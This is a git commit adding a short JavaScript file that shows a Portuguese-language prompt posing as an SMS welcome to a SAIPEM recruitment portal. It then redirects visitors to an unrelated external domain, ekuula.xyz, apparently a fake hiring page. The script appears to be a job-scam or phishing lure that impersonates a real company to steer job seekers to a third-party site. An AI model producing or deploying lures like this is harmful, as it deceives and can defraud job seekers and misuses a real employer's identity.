0964df548f5a6b29efa35d4b2cbf0a9ca3a3b6f4
bigetijazz28 <bigetijazz28@gmail.com>
2025-09-11 10:12:03 +0100

    Create angosaipem.js

---
+++ angosaipem.js
@@ -0,0 +1,5 @@
+var password = 'Recrutamento SAIPEM'
+password=prompt('SMS: Bem-vindo ao portal de inscrições do SAIPEM, clique em OK para se inscrever','Recrutamento SAIPEM');
+if (password != 'Recrutamento SAIPEM') {
+location.href='https://www.ekuula.xyz/SAIPEM-Recrutar';
+}
